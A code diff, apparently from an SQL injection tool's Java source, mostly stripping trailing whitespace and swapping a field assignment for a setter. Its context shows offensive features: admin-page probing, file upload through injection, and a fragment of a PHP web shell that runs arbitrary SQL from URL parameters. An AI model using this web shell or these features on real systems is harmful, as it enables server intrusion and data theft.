@@ -98,7 +98,7 @@ public class RessourceAccess {
     private static boolean isSearchFileStopped = false;
 
     /**
-     * True if current user has right to read file. 
+     * True if current user has right to read file.
      */
     private static boolean readingIsAllowed = false;
 
@@ -116,7 +116,7 @@ public class RessourceAccess {
      * Check if every page in the list responds 200 OK.
      * @param urlInjection
      * @param pageNames List of admin pages ot test
-     * @throws InterruptedException 
+     * @throws InterruptedException
      */
     public static void createAdminPages(String urlInjection, List<ListItem> pageNames) throws InterruptedException {
         String urlWithoutProtocol = urlInjection.replaceAll("^https?://[^/]*", "");
@@ -146,8 +146,8 @@ public class RessourceAccess {
         int submittedTasks = directoryNames.size() * pageNames.size();
         int tasksHandled;
         for (
-            tasksHandled = 0; 
-            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped; 
+            tasksHandled = 0;
+            tasksHandled < submittedTasks && !RessourceAccess.isSearchAdminStopped;
             tasksHandled++
         ) {
             try {
@@ -170,10 +170,10 @@ public class RessourceAccess {
 
         RessourceAccess.isSearchAdminStopped = false;
 
-        String result = 
+        String result =
             "Found "+ nbAdminPagesFound +" page"+( nbAdminPagesFound > 1 ? 's' : "" )+" "
             + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
-            + "on a total of "+ submittedTasks 
+            + "on a total of "+ submittedTasks
         ;
         if (nbAdminPagesFound > 0) {
             LOGGER.debug(result);
@@ -338,7 +338,7 @@ public class RessourceAccess {
             return;
         }
         
-        String payloadSQL = 
+        String payloadSQL =
             "<"+ DataAccess.LEAD +"><?php mysql_connect('localhost',$_GET['u'],$_GET['p']);"
                 + "$result=mysql_query($r=$_GET['q'])or die('<SQLe>Query failed: '.mysql_error().'<"+ DataAccess.TRAIL +">');"
                 + "if(is_resource($result)){"
@@ -425,8 +425,8 @@ public class RessourceAccess {
                 if (!listRows.isEmpty()) {
                     List<Integer> listFieldsLength = new ArrayList<>();
                     for (
-                        final int[] indexLongestRowSearch = {0}; 
-                        indexLongestRowSearch[0] < listRows.get(0).size(); 
+                        final int[] indexLongestRowSearch = {0};
+                        indexLongestRowSearch[0] < listRows.get(0).size();
                         indexLongestRowSearch[0]++
                     ) {
                         Collections.sort(
@@ -487,7 +487,7 @@ public class RessourceAccess {
      * @param urlFile URL of uploaded file
      * @param file File to upload
      * @throws JSqlException
-     * @throws IOException 
+     * @throws IOException
      */
     public static void uploadFile(String pathFile, String urlFile, File file) throws JSqlException, IOException {
         if (!RessourceAccess.isReadingAllowed()) {
@@ -609,7 +609,7 @@ public class RessourceAccess {
                     request.setMessage(TypeRequest.MESSAGE_HEADER);
                     request.setParameters(msgHeader);
                     MediatorModel.model().sendToViews(request);
-                } 
+                }
             }
         } else {
             throw new JSqlException("Incorrect Upload payload integrity: "+ sourcePage[0].trim().replaceAll("\\n", "\\\\\\n"));
@@ -687,7 +687,7 @@ public class RessourceAccess {
         int submittedTasks = pathsFiles.size();
         int tasksHandled;
         for (
-            tasksHandled = 0 ; 
+            tasksHandled = 0 ;
             tasksHandled < submittedTasks && !RessourceAccess.isSearchFileStopped ;
             tasksHandled++
         ) {
@@ -722,10 +722,10 @@ public class RessourceAccess {
         
         RessourceAccess.isSearchFileStopped = false;
         
-        String result = 
+        String result =
             "Found "+ countFileFound +" file"+( countFileFound > 1 ? 's' : "" )+" "
             + (tasksHandled != submittedTasks ? "of "+ tasksHandled +" processed " : "")
-            + "on a total of "+ submittedTasks 
+            + "on a total of "+ submittedTasks
         ;
         if (countFileFound > 0) {
             LOGGER.debug(result);
@@ -740,7 +740,7 @@ public class RessourceAccess {
     
     /**
      * Start fast scan of URLs in sequence and display result.
-     * Unplug any existing view and plug a console-like view in order to 
+     * Unplug any existing view and plug a console-like view in order to
      * respond appropriately to GUI message with simple text result instead of
      * build complex graphical components during the multi website injections.
      * At the end of the scan it plugs again the normal view.
@@ -764,7 +764,7 @@ public class RessourceAccess {
         MediatorModel.model().deleteObservers();
         MediatorModel.model().addObserver(new ScanListTerminal());
         
-        MediatorModel.model().isScanning = true;
+        MediatorModel.model().setIsScanning(true);
         RessourceAccess.isScanStopped = false;
         
         for (ListItem url: urlList) {
@@ -786,7 +786,7 @@ public class RessourceAccess {
         // TODO Don't play with View on Model
         MediatorModel.model().addObserver(MediatorGui.frame().getObserver());
         
-        MediatorModel.model().isScanning = false;
+        MediatorModel.model().setIsScanning(false);
         MediatorModel.model().setIsStoppedByUser(false);
         RessourceAccess.isScanStopped = false;
 
